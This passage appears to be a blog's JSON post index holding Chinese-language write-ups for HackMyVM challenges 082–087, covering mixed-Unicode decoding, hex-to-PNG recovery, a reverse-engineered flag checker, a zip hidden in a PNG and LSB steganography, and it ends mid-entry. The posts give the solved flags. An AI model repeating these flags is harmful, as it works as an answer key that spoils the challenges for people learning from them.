\u6587\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u5806\u4e71\u7801\uff0c\u4f46\u5176\u4e2d\u5939\u6742\u7740\u4e00\u4e9b\u53ef\u8bc6\u522b\u7684\u201c\u82b1\u5f0f\u201d\u5b57\u7b26\uff0c\u5e76\u4e14\u80fd\u52c9\u5f3a\u770b\u51fa `HMV{...}` \u7684\u7ed3\u6784\uff0c\u8fd9\u4e0e\u9898\u76ee\u63d0\u793a\u76f8\u7b26\u3002\n\n> \u9898\u76ee\u63d0\u793a:\n> 8Universal 16Threads of 32Friendship. Flag format: HMV{...}\n> 8Universal \u52a0\u5bc6\u540e\u7684\u6570\u636e\u4ee5 UTF-8 \u7f16\u7801\u5448\u73b0\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/82]\n\u2514\u2500$ cat 082.bin \n\u24bd<\ufffd\\\ufffd\ufffd6{\ufffdw\ud835\udd605\u0620\ufffd\ufffd5\u077e\ufffd\ufffd_\ud835\ude645\ufffd'\ufffd_5\ufffd\ufffd\ud835\udcd5}\n```\n\n\u4f7f\u7528 `xxd -p` \u5f97\u5230\u6587\u4ef6\u7684\u5b8c\u6574\u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u8fd9\u662f\u6211\u4eec\u540e\u7eed\u5206\u6790\u7684\u57fa\u7840\uff1a\n\n```bash\ne292bd3cd85cddff367b0000000001d477f09d95a035d8a0ded835ddbeff\nd501000000005ff09d99a435d827de005f35ff00000001d413f09d93957d\n00\n```\n\n# 2. \u6838\u5fc3\u7a81\u7834\uff1a\u8bc6\u522b\u6df7\u5408\u7f16\u7801\n\n\u8fd9\u662f\u89e3\u5f00\u8c1c\u9898\u6700\u5173\u952e\u7684\u4e00\u6b65\u3002\u6211\u4eec\u5c06\u6ce8\u610f\u529b\u96c6\u4e2d\u5728\u6587\u4ef6\u5f00\u5934\u7684 `HMV` \u90e8\u5206\u3002\u901a\u8fc7\u5728 CyberChef \u7b49\u5de5\u5177\u4e2d\u53cd\u590d\u5c1d\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u5b83\u662f\u7531\u591a\u79cd\u7f16\u7801\u65b9\u5f0f\u6df7\u5408\u800c\u6210\u7684\uff1a\n\n*   **H**: \u7531\u5b57\u8282 `e292bd` \u8868\u793a\u3002\u8fd9\u5728 **UTF-8** \u7f16\u7801\u4e0b\uff0c\u6b63\u597d\u662f\u5e26\u5708\u5b57\u6bcd `\u24bd`\u3002\n*   **M**: \u7531\u5b57\u8282 `3cd85cdd` \u8868\u793a\u3002\u8fd9\u5728 **UTF-16LE** (\u5c0f\u7aef\u5e8f) \u7f16\u7801\u4e0b\uff0c\u662f\u5e26\u5708\u5b57\u6bcd `\ud83c\udd5c`\u3002\n*   **V**: \u7531\u5b57\u8282 `ff36` \u8868\u793a\u3002\u8fd9\u5728 **UTF-16BE** (\u5927\u7aef\u5e8f) \u7f16\u7801\u4e0b\uff0c\u662f\u5168\u89d2\u5b57\u6bcd `\uff36`\u3002\n\n\u8fd9\u4e2a\u53d1\u73b0\u8bc1\u5b9e\u4e86\u9898\u76ee\u63d0\u793a `'8Universal 16Threads of 32Friendship'` \u7684\u542b\u4e49\uff1aFlag \u4e2d\u7684\u5b57\u7b26\u88ab\u66ff\u6362\u4e3a\u4e86\u5404\u79cd\u201c\u82b1\u5f0f\u201dUnicode \u5b57\u7b26\uff0c\u5e76\u4e14\u8fd9\u4e9b\u5b57\u7b26\u81ea\u8eab\u53c8\u5206\u522b\u4f7f\u7528\u4e86 UTF-8\u3001UTF-16 \u751a\u81f3 UTF-32 \u8fdb\u884c\u4e86\u7f16\u7801\uff0c\u6700\u540e\u62fc\u63a5\u5728\u4e00\u8d77\u3002\n\n# 3. \u9010\u4e2a\u51fb\u7834\uff1a\u89e3\u7801 Flag \u5185\u5bb9\n\n\u6211\u4eec\u8bc6\u522b\u51fa `7b` \u662f `{` \u7684 ASCII \u7801\uff0c`7d00` \u4ee3\u8868 `}`\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5bf9\u82b1\u62ec\u53f7\u4e2d\u95f4\u7684\u6838\u5fc3\u6570\u636e\u8fdb\u884c\u9010\u4e2a\u89e3\u7801\uff1a\n\n`00000000 01d477f09d95a035d8a0ded835ddbeff d50100000000 5ff09d99a435d827de00 5f35ff00000001d413f09d9395`\n\n\u901a\u8fc7\u7ec6\u81f4\u5730\u624b\u52a8\u5206\u6bb5\u548c\u89e3\u7801\uff0c\u6211\u4eec\u62fc\u51d1\u51fa Flag \u7684\u5404\u4e2a\u90e8\u5206\uff1a\n\n1.  `0001d477` -> **UTF-32BE** -> `\ud835\udc77` (\u5bf9\u5e94 'p')\n2.  `f09d95a0` -> **UTF-8** -> `\ud835\udd60` (\u5bf9\u5e94 'o')\n3.  `35d8a0de` -> **UTF-32LE** -> `w`\n4.  `d835ddbe` -> **UTF-16BE** -> `\ud835\uddf2` (\u5bf9\u5e94 'e')\n5.  `ffd501` -> **UTF-32LE** -> `\ud835\uddff` (\u5bf9\u5e94 'r')\n6.  `5f` -> **ASCII** -> `_`\n7.  `f09d99a4` -> **UTF-8** -> `\ud835\ude64` (\u5bf9\u5e94 'o')\n8.  `f09d9395` -> **UTF-8** -> `\ud835\udcd5` (\u5bf9\u5e94 'f')\n9.  `5f` -> **ASCII** -> `_`\n10.  `35ff` -> **UTF-16LE** -> `\uff35` (\u5bf9\u5e94 'U')\n11.  `0001d413`-> **UTF-32BE** -> `\ud835\udc13` (\u5bf9\u5e94 't')\n12.  `f09d9395` -> **UTF-8** -> `\ud835\udcd5` (\u5bf9\u5e94 'f')\n\n# 4. \u7ed3\u8bba\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n\n```\nHMV{power_of_Utf}\n```\nsentence", "top": 0, "createdAt": 1754440742, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P170": {"htmlDir": "docs/post/Challenge 083.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 083", "postUrl": "post/Challenge%20083.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/170", "commentNum": 0, "wordCount": 2128, "description": "![image-20250803095854556](http://7r1UMPHK.github.io/image/20250803095903114.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 083.zip -o083\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 804934 bytes (787 KiB)\n\nExtracting archive: 083.zip\n--\nPath = 083.zip\nType = zip\nPhysical Size = 804934\n\nEverything is Ok\n\nSize:       1516128\nCompressed: 804934\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd 083\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/083]\n\u2514\u2500$ ls -al                \n\u603b\u8ba1 1485\ndrwxr-xr-x 1 kali kali       0  8\u6708 2\u65e5 21:59 .\ndrwxr-xr-x 1 kali kali    4096  8\u6708 2\u65e5 21:59 ..\n-rwxr-xr-x 1 kali kali 1516128 2024\u5e74 8\u670826\u65e5 secret\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/083]\n\u2514\u2500$ head -n 10 secret \n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR\n00000010: 0000 0271 0000 0190 0806 0000 00c1 7d36  ...q..........}6\n00000020: 8200 0020 0049 4441 5478 5eec 9d07 9c5d  ... .IDATx^....]\n00000030: 45d5 c067 b37d d37b af84 2484 2420 bd08  E..g.}.{..$.$ ..\n00000040: 0888 0554 1450 143f ac88 8a15 6cd8 150b  ...T.P.?....l...\n00000050: 62c3 aea8 8852 6c54 7b41 102c 8080 0212  b....RlT{A.,....\n00000060: 0221 a186 12d2 7bd9 92fd ceff dc77 36b3  .!....{......w6.\n00000070: 93b9 77ee ee4b 4854 1ebf b0bb efde 3b77  ..w..KHT......;w\n00000080: ea99 ff9c 73e6 4ccd 9f7f 7c6e e7c6 8d1b  ....s.L...|n....\n00000090: ddf0 e1c3 dd9d 77de e996 2e5f e6c6 8c19  ......w...._....\n```\n\nsecret\u7ecf\u8fc7\u67e5\u770b\u662fxxd png\u7684\u7ed3\u679c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/083]\n\u2514\u2500$ xxd -r secret > secret.png\n```\n\n![secret](http://7r1UMPHK.github.io/image/20250803100524026.webp)\n\n\u56fe\u7247\u4e0a\u6709\u4e2abase64\n\n```bash\nSE1We2FuY2llbnR0aW1lczE40DB9Cg==\n```\n\n\u53bbCyberChef\u89e3\u7801\n\n```bash\nHMV{ancienttimes1880}\n```\n\nsentence", "top": 0, "createdAt": 1754440761, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P171": {"htmlDir": "docs/post/Challenge 084.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 084", "postUrl": "post/Challenge%20084.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/171", "commentNum": 0, "wordCount": 5317, "description": "![image-20250803100714272](http://7r1UMPHK.github.io/image/20250803100714514.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 084.zip -o084\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 414206 bytes (405 KiB)\n\nExtracting archive: 084.zip\n--\nPath = 084.zip\nType = zip\nPhysical Size = 414206\n\nEverything is Ok\n\nFiles: 2\nSize:       1051168\nCompressed: 414206\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd 084 \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/084]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 1031\ndrwxr-xr-x 1 kali kali       0  8\u6708 2\u65e5 22:07 .\ndrwxr-xr-x 1 kali kali    4096  8\u6708 2\u65e5 22:07 ..\n-rwxr-xr-x 1 kali kali   16224 2024\u5e74 9\u670826\u65e5 hmv-012\n-rwxr-xr-x 1 kali kali 1034944 2024\u5e74 9\u670826\u65e5 hmv-012-static\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/084]\n\u2514\u2500$ ./hmv-012-static      \nEnter the flag: xxoo\nIncorrect flag.\n```\n\n\u53cd\u7f16\u8bd1\n\n```c\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  int v4; // eax\n  int i; // [rsp+Ch] [rbp-74h]\n  int v6; // [rsp+10h] [rbp-70h]\n  int v7; // [rsp+14h] [rbp-6Ch]\n  int v8; // [rsp+18h] [rbp-68h]\n  int v9; // [rsp+1Ch] [rbp-64h]\n  int v10; // [rsp+20h] [rbp-60h]\n  int v11; // [rsp+24h] [rbp-5Ch]\n  int v12; // [rsp+28h] [rbp-58h]\n  int v13; // [rsp+2Ch] [rbp-54h]\n  int v14; // [rsp+30h] [rbp-50h]\n  int v15; // [rsp+34h] [rbp-4Ch]\n  int v16; // [rsp+38h] [rbp-48h]\n  int v17; // [rsp+3Ch] [rbp-44h]\n  int v18; // [rsp+40h] [rbp-40h]\n  int v19; // [rsp+44h] [rbp-3Ch]\n  int v20; // [rsp+48h] [rbp-38h]\n  char s1[24]; // [rsp+60h] [rbp-20h] BYREF\n  unsigned __int64 v22; // [rsp+78h] [rbp-8h]\n\n  v22 = __readfsqword(0x28u);\n  printf('Enter the flag: ');\n  __isoc99_scanf('%20s', s1);\n  for ( i = 0; i <= 19; ++i )\n    *(&v6 + i) = s1[i];\n  if ( !strcmp(s1, 'HMV{StringsAgain?}') )\n  {\n    print_hint();\n    return 0;\n  }\n  else\n  {\n    if ( v6 == 72\n      && (v4 = 8 * v7, LOBYTE(v4) = (8 * v7) ^ 0x90, (v4 | ((3 * (v7 ^ 0x13)) >> 3)) == 763)\n      && ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) >> 4)) == 1096\n      && ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) >> 5)) == 3379\n      && v10 == 90\n      && ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) >> 5)) == 267\n      && ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) >> 4)) == 2143\n      && v13 == 79\n      && ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) >> 2)) == 4648\n      && v15 == 95\n      && ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) >> 3)) == 1957\n      && ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) >> 3)) == 3068\n      && v18 == 103\n      && ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) >> 3)) == 2398\n      && ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) >> 3)) == 2595 )\n    {\n      puts('Congratulations! This is the correct flag.');\n    }\n    else\n    {\n      puts('Incorrect flag.');\n    }\n    return 0;\n  }\n}\n```\n\n\u8fdb\u53bbprint_hint\u51fd\u6570\u770b\u4e86\u773c\uff0cHMV{StringsAgain?}\u662f\u5047flag\n\n\u5199\u4e2apy\u7b97\u4e00\u4e0b\n\n```python\ndef slv_v7():\n    for i in range(32, 127):\n        v7 = i\n        v4_temp = 8 * v7\n        v4 = (v4_temp & 0xFFFFFF00) | ((v4_temp & 0xFF) ^ 0x90)\n        if (v4 | ((3 * (v7 ^ 0x13)) >> 3)) == 763:\n            return chr(i)\n\ndef slv_v8():\n    for i in range(32, 127):\n        v8 = i\n        if ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) >> 4)) == 1096:\n            return chr(i)\n\ndef slv_v9():\n    for i in range(32, 127):\n        v9 = i\n        if ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) >> 5)) == 3379:\n            return chr(i)\n\ndef slv_v11():\n    for i in range(32, 127):\n        v11 = i\n        if ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) >> 5)) == 267:\n            return chr(i)\n\ndef slv_v12():\n    for i in range(32, 127):\n        v12 = i\n        if ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) >> 4)) == 2143:\n            return chr(i)\n\ndef slv_v14():\n    for i in range(32, 127):\n        v14 = i\n        if ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) >> 2)) == 4648:\n            return chr(i)\n\ndef slv_v16():\n    for i in range(32, 127):\n        v16 = i\n        if ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) >> 3)) == 1957:\n            return chr(i)\n\ndef slv_v17():\n    for i in range(32, 127):\n        v17 = i\n        if ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) >> 3)) == 3068:\n            return chr(i)\n\ndef slv_v19():\n    for i in range(32, 127):\n        v19 = i\n        if ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) >> 3)) == 2398:\n            return chr(i)\n\ndef slv_v20():\n    for i in range(32, 127):\n        v20 = i\n        if ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) >> 3)) == 2595:\n            return chr(i)\n\nif __name__ == '__main__':\n    flag = ['' for _ in range(15)]\n    \n    flag[0] = 'H'\n    flag[1] = slv_v7()\n    flag[2] = slv_v8()\n    flag[3] = slv_v9()\n    flag[4] = 'Z'\n    flag[5] = slv_v11()\n    flag[6] = slv_v12()\n    flag[7] = 'O'\n    flag[8] = slv_v14()\n    flag[9] = '_'\n    flag[10] = slv_v16()\n    flag[11] = slv_v17()\n    flag[12] = 'g'\n    flag[13] = slv_v19()\n    flag[14] = slv_v20()\n    \n    print(''.join(flag))\n```\n\nflag\n\n```bash\nHMV{Z0nl_bigt}\n```\n\n\n\nsentence", "top": 0, "createdAt": 1754440775, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P172": {"htmlDir": "docs/post/Challenge 085.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 085", "postUrl": "post/Challenge%20085.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/172", "commentNum": 0, "wordCount": 3664, "description": "![image-20250803102242549](http://7r1UMPHK.github.io/image/20250803102242764.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 085.zip -o085\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 3032 bytes (3 KiB)\n\nExtracting archive: 085.zip\n--\nPath = 085.zip\nType = zip\nPhysical Size = 3032\n\nEverything is Ok\n\nSize:       2923\nCompressed: 3032\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd 085 \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/085]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 7\ndrwxr-xr-x 1 kali kali    0  8\u6708 2\u65e5 22:23 .\ndrwxr-xr-x 1 kali kali 4096  8\u6708 2\u65e5 22:23 ..\n-rwxr-xr-x 1 kali kali 2923 2024\u5e74 9\u670829\u65e5 flag.png\n```\n\nflag.png\u6ca1\u6709\u53ef\u663e\u793a\u7684\u5185\u5bb9\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/085]\n\u2514\u2500$ exiftool flag.png \nExifTool Version Number         : 13.25\nFile Name                       : flag.png\nDirectory                       : .\nFile Size                       : 2.9 kB\nFile Modification Date/Time     : 2024:09:29 08:11:46-04:00\nFile Access Date/Time           : 2025:08:02 22:23:20-04:00\nFile Inode Change Date/Time     : 2024:09:29 08:11:46-04:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : ZIP\nFile Type Extension             : zip\nMIME Type                       : application/zip\nZip Required Version            : 20\nZip Bit Flag                    : 0\nZip Compression                 : None\nZip Modify Date                 : 2024:09:14 23:42:20\nZip CRC                         : 0x00000000\nZip Compressed Size             : 0\nZip Uncompressed Size           : 0\nZip File Name                   : hidden/\nWarning                         : [minor] Use the Duplicates option to extract tags for all 2 files\n```\n\n\u90a3\u76f4\u63a5\u89e3\u538b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/085]\n\u2514\u2500$ 7z x flag.png     \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 2923 bytes (3 KiB)\n\nExtracting archive: flag.png\n--\nPath = flag.png\nType = zip\nPhysical Size = 2923\n\nEverything is Ok\n\nFolders: 1\nFiles: 1\nSize:       2784\nCompressed: 2923\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/085]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 7\ndrwxr-xr-x 1 kali kali    0 2025\u5e74 8\u6708 2\u65e5 .\ndrwxr-xr-x 1 kali kali 4096  8\u6708 2\u65e5 22:23 ..\n-rwxr-xr-x 1 kali kali 2923 2024\u5e74 9\u670829\u65e5 flag.png\ndrwxr-xr-x 1 kali kali    0 2024\u5e74 9\u670814\u65e5 hidden\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/085]\n\u2514\u2500$ cd hidden \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/x/tmp/085/hidden]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 3\ndrwxr-xr-x 1 kali kali    0 2024\u5e74 9\u670814\u65e5 .\ndrwxr-xr-x 1 kali kali    0  8\u6708 2\u65e5 22:26 ..\n-rwxr-xr-x 1 kali kali 2784 2024\u5e74 9\u670814\u65e5 flag.png\n```\n\n![image-20250803102641124](http://7r1UMPHK.github.io/image/20250803102641231.webp)\n\n```\nHMV{F0r3N51C_3xP3rT_1N_7H3_R00M}\n```\n\nsentence", "top": 0, "createdAt": 1754440791, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P173": {"htmlDir": "docs/post/Challenge 086.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 086", "postUrl": "post/Challenge%20086.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/173", "commentNum": 0, "wordCount": 5539, "description": "![image-20250803102805187](http://7r1UMPHK.github.io/image/20250803102805423.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 086.zip -o086\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 98681 bytes (97 KiB)\n\nExtracting archive: 086.zip\n--\nPath = 086.zip\nType = zip\nPhysical Size = 98681\n\nEverything is Ok\n\nSize:       100517\nCompressed: 98681\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd 086   \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/086]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 103\ndrwxr-xr-x 1 kali kali      0 2025\u5e74 8\u6708 2\u65e5 .\ndrwxr-xr-x 1 kali kali   4096 2025\u5e74 8\u6708 2\u65e5 ..\n-rwxr-xr-x 1 kali kali 100517 2024\u5e74 9\u670829\u65e5 EZPZ.png\n```\n\n![image-20250803102855174](http://7r1UMPHK.github.io/image/20250803102855280.webp)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/086]\n\u2514\u2500$ exiftool EZPZ.png \nExifTool Version Number         : 13.25\nFile Name                       : EZPZ.png\nDirectory                       : .\nFile Size                       : 101 kB\nFile Modification Date/Time     : 2024:09:29 08:13:27-04:00\nFile Access Date/Time           : 2025:08:02 22:28:55-04:00\nFile Inode Change Date/Time     : 2024:09:29 08:13:27-04:00\nFile Permissions                : -rwxr-xr-x\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 500\nImage Height                    : 461\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nProfile Name                    : ICC Profile\nProfile CMM Type                : Little CMS\nProfile Version                 : 4.4.0\nProfile Class                   : Display Device Profile\nColor Space Data                : RGB\nProfile Connection Space        : XYZ\nProfile Date Time               : 2024:09:14 17:27:52\nProfile File Signature          : acsp\nPrimary Platform                : Apple Computer Inc.\nCMM Flags                       : Not Embedded, Independent\nDevice Manufacturer             : \nDevice Model                    : \nDevice Attributes               : Reflective, Glossy, Positive, Color\nRendering Intent                : Perceptual\nConnection Space Illuminant     : 0.9642 1 0.82491\nProfile Creator                 : Little CMS\nProfile ID                      : 0\nProfile Description             : GIMP built-in sRGB\nProfile Copyright               : Public Domain\nMedia White Point               : 0.9642 1 0.82491\nChromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168\nRed Matrix Column               : 0.43604 0.22249 0.01392\nBlue Matrix Column              : 0.14305 0.06061 0.71393\nGreen Matrix Column             : 0.38512 0.7169 0.09706\nRed Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)\nGreen Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)\nBlue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)\nChromaticity Channels           : 3\nChromaticity Colorant           : Unknown\nChromaticity Channel 1          : 0.64 0.33002\nChromaticity Channel 2          : 0.3 0.60001\nChromaticity Channel 3          : 0.15001 0.06\nDevice Mfg Desc                 : GIMP\nDevice Model Desc               : sRGB\nComment                         : MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE=\nImage Size                      : 500x461\nMegapixels                      : 0.231\n```\n\n![image-20250803103024253](http://7r1UMPHK.github.io/image/20250803103024563.webp)\n\nbase64 binary\n\n```\nABG_N_SYNT{YFO}\n```\n\n\u662frot13\uff0c\u4f46\u662f\u88ab\u800d\u4e86\n\n![image-20250803103450684](http://7r1UMPHK.github.io/image/20250803103450943.webp)\n\n\u90a3\u770blsb\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/086]\n\u2514\u2500$ zsteg EZPZ.png\nmeta Comment        .. text: 'MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE='\nimagedata           .. file: amd 29k coff noprebar executable\nb1,r,lsb,xy         .. text: 'HMV{I7_w45_3a5y_R1GH7}'\nb1,rgb,msb,xy       .. file: OpenPGP Public Key\nb2,g,lsb,xy         .. file: VISX image file\nb3,bgr,lsb,xy       .. file: OpenPGP Secret Key\nb4,g,lsb,xy         .. text: 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUDDUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'\nb4,b,lsb,xy         .. text: 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD33DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'\nb4,b,msb,xy         .. text: ['\\'' repeated 186 times]\n```\n\nflag\n\n```\nHMV{I7_w45_3a5y_R1GH7}\n```\n\nsentence", "top": 0, "createdAt": 1754440809, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P174": {"htmlDir": "docs/post/Challenge 087.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 087", "postUrl": "post/Challenge%20087.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/174", "commentNum": 0, "wordCount": 632, "description": "![image-20250803103549525](http://7r1UMPHK.github.io/image/20250803103549762.webp)\n\n```bash\nProblem: SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg== Hint: key is kerszi and what can you see ? Flag format: 